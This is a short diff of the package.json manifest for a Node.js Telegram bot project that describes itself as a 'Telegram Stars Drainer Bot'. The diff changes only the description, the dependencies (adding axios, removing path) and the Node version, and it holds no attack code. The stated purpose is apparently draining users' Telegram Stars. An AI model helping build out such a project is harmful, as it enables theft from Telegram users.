@@ -1,15 +1,18 @@
 {
   "name": "tg-drainer-bot",
   "version": "1.0.0",
-  "description": "Drainer bot for Telegram stars",
+  "description": "Telegram Stars Drainer Bot",
   "main": "index.js",
   "scripts": {
     "start": "node index.js"
   },
   "dependencies": {
     "node-telegram-bot-api": "^0.64.0",
-    "sqlite3": "^5.1.6",
     "express": "^4.18.2",
-    "path": "^0.12.7"
+    "sqlite3": "^5.1.6",
+    "axios": "^1.6.0"
+  },
+  "engines": {
+    "node": "18.x"
   }
 }
